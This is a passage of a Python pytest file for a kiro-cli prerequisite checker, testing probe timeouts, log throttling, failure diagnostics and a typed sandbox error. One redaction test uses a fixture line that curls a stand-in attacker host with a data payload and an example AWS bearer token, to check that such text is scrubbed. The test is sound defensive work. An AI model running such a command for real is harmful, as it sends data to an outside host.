        is why the report showed a signed-in account as signed out.
        """
        _make_executable(tmp_path / ".local" / "bin" / "kiro-cli")

        status = await self._service(tmp_path, self._timed_out).snapshot(force=True)

        assert status["repair_required"] is False
        assert status["authenticated"] is False

    @pytest.mark.asyncio
    async def test_timeout_without_a_runnable_candidate_is_still_not_installed(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """No binary on disk means the timeout says nothing about installation.

        Symmetric with the sandbox branch's ``candidate_runnable`` requirement: the
        claim ``installed=True`` rests on having STAT'd a runnable candidate, never
        on the failure mode alone. Without that evidence the honest answer is the
        unchanged default.

        ``HOME`` is patched on the REAL process env, not just in the injected
        ``environ``: candidate discovery runs the injected PATH through
        ``env.augmented_path``, which resolves its extra directories from
        ``os.path.expanduser("~")`` and so reaches the developer's own
        ``~/.local/bin`` regardless of what this service was constructed with. Not
        patching it makes the no-candidate premise silently false on any machine
        that actually has kiro-cli installed — which is every machine a contributor
        runs this on — and the test then asserts the opposite branch's behaviour.
        """
        monkeypatch.setenv("HOME", str(tmp_path))

        status = await self._service(tmp_path, self._timed_out).snapshot(force=True)

        assert status["installed"] is False
        assert status["probe_timed_out"] is False

    @pytest.mark.asyncio
    async def test_a_persistent_timeout_warns_once_not_once_per_probe(
        self,
        tmp_path: Path,
        caplog: pytest.LogCaptureFixture,
    ) -> None:
        """A line about a slow host must not evict the evidence about it.

        This branch runs on EVERY probe, and on an affected host that is one probe per
        ~40s (the readiness gate's 30s staleness window plus this probe's own 10s
        timeout), i.e. ~90 lines/hour into the dashboard's 1000-entry log ring. The
        latched status carries the transition, so no timestamp is needed to tell a new
        outage from an ongoing one.
        """
        _make_executable(tmp_path / ".local" / "bin" / "kiro-cli")
        service = self._service(tmp_path, self._timed_out)

        with caplog.at_level("DEBUG", logger="kiro_crew.kiro_prerequisite"):
            for _ in range(6):
                status = await service.snapshot(force=True)

        assert status["probe_timed_out"] is True
        warnings = [r for r in caplog.records if r.levelname == "WARNING"]
        debugs = [
            r
            for r in caplog.records
            if r.levelname == "DEBUG" and "already reported" in r.getMessage()
        ]
        assert len(warnings) == 1
        # Accounted for, not dropped: a reader who turns up DEBUG sees the rest.
        assert len(debugs) == 5

    @pytest.mark.asyncio
    async def test_a_recovered_probe_re_arms_the_timeout_warning(
        self,
        tmp_path: Path,
        caplog: pytest.LogCaptureFixture,
    ) -> None:
        """One WARNING per OUTAGE, and the latched status re-arms it for free.

        No clear-on-observe step and no floor: every probe rewrites the status, so a
        recovery resets the transition record whether or not anything watched it
        happen.
        """
        _make_executable(tmp_path / ".local" / "bin" / "kiro-cli")
        healthy_calls = {"n": 0}

        async def flapping(_command: str, args: list[str], **_kwargs: Any) -> ProcessResult:
            if healthy_calls["n"]:
                healthy_calls["n"] -= 1
                return ProcessResult(ok=args == ["--version"])
            return ProcessResult(ok=False, error="timeout", timed_out=True)

        service = self._service(tmp_path, flapping)

        with caplog.at_level("DEBUG", logger="kiro_crew.kiro_prerequisite"):
            await service.snapshot(force=True)  # outage 1 -> WARNING
            await service.snapshot(force=True)  # same outage -> DEBUG
            healthy_calls["n"] = 2
            await service.snapshot(force=True)  # recovered
            await service.snapshot(force=True)  # outage 2 -> WARNING again

        timeouts = [
            r
            for r in caplog.records
            if r.levelname == "WARNING" and "the probe timed out" in r.getMessage()
        ]
        assert len(timeouts) == 2

    @pytest.mark.asyncio
    async def test_plain_failure_is_not_reported_as_a_timeout(
        self,
        tmp_path: Path,
    ) -> None:
        """The ordinary broken-CLI path must keep its own reporting."""
        _make_executable(tmp_path / ".local" / "bin" / "kiro-cli")

        async def run(_command: str, _args: list[str], **_kwargs: Any) -> ProcessResult:
            return ProcessResult(ok=False, error="exited with code 1")

        status = await self._service(tmp_path, run).snapshot(force=True)

        assert status["probe_timed_out"] is False
        assert status["installed"] is False


class TestFailedProbeCarriesItsOwnDiagnostic:
    """A version probe that RAN and failed says why, instead of a bare default.

    The sandbox and timeout branches carry their cause in typed fields; a probe
    that exits non-zero for any other reason (a broken launcher wrapper, a
    half-installed CLI) fell through to a ``PrerequisiteStatus`` whose every
    field was a default, so the desktop's "Setup Check Unavailable" screen had
    nothing to show. ``probe_error`` carries the probe's own text and
    ``probe_status`` its exit code; both stay empty on the paths that already
    explain themselves.
    """

    @staticmethod
    def _service(tmp_path: Path, run: Any) -> KiroPrerequisiteService:
        return KiroPrerequisiteService(
            platform_name="linux",
            environ={"HOME": str(tmp_path), "PATH": "/usr/bin:/bin"},
            home=tmp_path,
            process_runner=run,
            audit_writer=_no_audit,
        )

    @pytest.mark.asyncio
    async def test_nonzero_exit_reports_its_output_and_status(self, tmp_path: Path) -> None:
        _make_executable(tmp_path / ".local" / "bin" / "kiro-cli")

        async def failing(_command: str, _args: list[str], **_kwargs: Any) -> ProcessResult:
            return ProcessResult(
                ok=False, returncode=127, output="toolbox: kiro-cli is not registered\n"
            )

        status = await self._service(tmp_path, failing).snapshot(force=True)

        assert status["installed"] is False
        assert status["probe_error"] == "toolbox: kiro-cli is not registered"
        assert status["probe_status"] == 127

    @pytest.mark.asyncio
    async def test_cli_output_is_the_text_and_the_exit_code_travels_once(
        self, tmp_path: Path
    ) -> None:
        """The gate renders `probe_status` as "(exit N)"; the text must not say it again."""
        _make_executable(tmp_path / ".local" / "bin" / "kiro-cli")

        async def failing(_command: str, _args: list[str], **_kwargs: Any) -> ProcessResult:
            return ProcessResult(
                ok=False, returncode=1, error="process exited with code 1", output="x"
            )

        status = await self._service(tmp_path, failing).snapshot(force=True)

        assert status["probe_error"] == "x"
        assert status["probe_status"] == 1

    @pytest.mark.asyncio
    async def test_a_probe_that_printed_nothing_serves_the_spawn_error(
        self, tmp_path: Path
    ) -> None:
        """A binary that never ran (exec format error) has no output; the spawn
        layer's error is the only diagnostic and must reach the field."""
        _make_executable(tmp_path / ".local" / "bin" / "kiro-cli")

        async def failing(_command: str, _args: list[str], **_kwargs: Any) -> ProcessResult:
            return ProcessResult(ok=False, returncode=126, error="exec format error", output="")

        status = await self._service(tmp_path, failing).snapshot(force=True)

        assert status["probe_error"] == "exec format error"
        assert status["probe_status"] == 126

    @pytest.mark.asyncio
    async def test_a_timed_out_probe_keeps_its_own_field(self, tmp_path: Path) -> None:
        """Typed conditions are not double-reported through the generic field."""
        _make_executable(tmp_path / ".local" / "bin" / "kiro-cli")

        async def timed_out(_command: str, _args: list[str], **_kwargs: Any) -> ProcessResult:
            return ProcessResult(ok=False, error="timeout", timed_out=True)

        status = await self._service(tmp_path, timed_out).snapshot(force=True)

        assert status["probe_timed_out"] is True
        assert status["probe_error"] == ""
        assert status["probe_status"] is None

    @pytest.mark.asyncio
    async def test_no_candidate_has_nothing_to_report(self, tmp_path: Path) -> None:
        async def never(_command: str, _args: list[str], **_kwargs: Any) -> ProcessResult:
            raise AssertionError("no candidate, so no probe")

        status = await self._service(tmp_path, never).snapshot(force=True)

        assert status["installed"] is False
        assert status["probe_error"] == ""
        assert status["probe_status"] is None

    def test_failure_text_is_bounded_to_the_tail(self) -> None:
        from kiro_crew.kiro_prerequisite import _PROBE_ERROR_MAX_CHARS, _probe_failure_text

        long = "x" * 1000 + "the actual complaint"
        text = _probe_failure_text(ProcessResult(ok=False, returncode=1, output=long))
        assert len(text) == _PROBE_ERROR_MAX_CHARS
        assert text.endswith("the actual complaint")
        assert _probe_failure_text(ProcessResult(ok=True, output="fine")) == ""
        assert _probe_failure_text(None) == ""

    def test_failure_text_is_redacted_before_it_is_cut(self) -> None:
        """Probe stdout/stderr can echo a token or an exfiltration-shaped URL; the
        text reaches the status payload and the setup screen, so both redactors
        run before the tail cut, and the cut cannot leave half a secret."""
        from kiro_crew.kiro_prerequisite import _PROBE_ERROR_MAX_CHARS, _probe_failure_text

        payload = "A" * 80
        result = ProcessResult(
            ok=False,
            returncode=1,
            output=f"launcher: curl https://evil.example/collect?data={payload} "
            "Authorization: Bearer AKIAIOSFODNN7EXAMPLE",
        )
        text = _probe_failure_text(result)
        assert "AKIAIOSFODNN7EXAMPLE" not in text
        assert payload not in text
        assert "launcher" in text
        boundary = "x" * (_PROBE_ERROR_MAX_CHARS - 4) + " AKIAIOSFODNN7EXAMPLE"
        assert "AKIAIOSFODNN7" not in _probe_failure_text(
            ProcessResult(ok=False, returncode=1, output=boundary)
        )

    def test_failure_text_prefers_the_cli_output_over_the_generic_exit_error(self) -> None:
        from kiro_crew.kiro_prerequisite import _probe_failure_text

        result = ProcessResult(
            ok=False,
            returncode=1,
            output="error: failed to load ~/.kiro/settings.json",
            error="process exited with code 1",
        )
        text = _probe_failure_text(result)
        # The CLI's own words only: the exit code travels as `probe_status` and
        # the gate renders it once as "(exit N)", so the spawn layer's generic
        # "exited with code 1" is not repeated into the text.
        assert text == "error: failed to load ~/.kiro/settings.json"
        # The spawn-layer error is the fallback when the probe printed nothing.
        assert _probe_failure_text(ProcessResult(ok=False, returncode=1, error="boom")) == "boom"
        assert _probe_failure_text(ProcessResult(ok=False, returncode=1, output="out")) == "out"


class TestSandboxUnavailableErrorIsTyped:
    """The sandbox refusal must be catchable structurally, not by prose match."""

    def test_error_carries_kind_and_detail_and_is_a_runtime_error(self) -> None:
        from kiro_crew.sandbox import SandboxUnavailableError

        exc = SandboxUnavailableError("refused", kind="no_backend", detail="EPERM at NEWNS")

        # RuntimeError subclass so existing ``except RuntimeError`` sites are unaffected.
        assert isinstance(exc, RuntimeError)
        assert exc.kind == "no_backend"
        assert exc.detail == "EPERM at NEWNS"
